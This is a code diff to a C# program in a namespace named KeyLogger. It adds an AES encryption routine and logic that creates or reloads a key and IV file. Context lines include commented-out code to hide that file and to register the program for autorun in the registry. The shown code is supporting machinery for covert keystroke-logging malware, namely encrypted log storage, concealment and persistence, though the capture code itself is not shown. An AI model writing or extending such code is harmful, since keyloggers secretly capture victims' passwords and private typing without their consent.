@@ -24,6 +24,27 @@ namespace KeyLogger
         byte[] key = new byte[16];
         byte[] iv = new byte[16];
         //Encrypt
+        static byte[] Encrypt(string simpletext, byte[] key, byte[] iv)
+        {
+            byte[] cipheredtext;
+            using (Aes aes = Aes.Create())
+            {
+                ICryptoTransform encryptor = aes.CreateEncryptor(key, iv);
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
+                    {
+                        using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
+                        {
+                            streamWriter.Write(simpletext);
+                        }
+
+                        cipheredtext = memoryStream.ToArray();
+                    }
+                }
+            }
+            return cipheredtext;
+        }
 
         //Decrypt
         static string Decrypt(byte[] cipheredtext, byte[] key, byte[] iv)
@@ -69,6 +90,51 @@ namespace KeyLogger
             rk.SetValue(keyName, programPath);*/
 
             //if_else trong public Form1();
+            if (!File.Exists(pass))
+            {
+
+                using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
+                {
+                    rng.GetBytes(key);
+                    rng.GetBytes(iv);
+                }
+                string key_string = BitConverter.ToString(key).Replace("-", "");
+                string iv_string = BitConverter.ToString(iv).Replace("-", "");
+                using (StreamWriter sw = File.CreateText(pass))
+                {
+                    sw.WriteLine(key_string);
+                    sw.WriteLine(iv_string);
+                }
+                //Code de an file pass.txt
+                //File.SetAttributes(pass, FileAttributes.Hidden);
+            }
+            else
+            {
+                string[] detached = new string[40];
+                string line;
+                int j = 0;
+                using (StreamReader sr = new StreamReader(pass))
+                {
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        if (line == "")
+                            continue;
+                        detached[j] = line;
+                        j++;
+                    }
+                }
+                key = new byte[detached[0].Length / 2];
+                for (int i = 0; i < detached[0].Length; i += 2)
+                {
+                    key[i / 2] = Convert.ToByte(detached[0].Substring(i, 2), 16);
+                }
+
+                iv = new byte[detached[1].Length / 2];
+                for (int i = 0; i < detached[1].Length; i += 2)
+                {
+                    iv[i / 2] = Convert.ToByte(detached[1].Substring(i, 2), 16);
+                }
+            }
 
         }
 
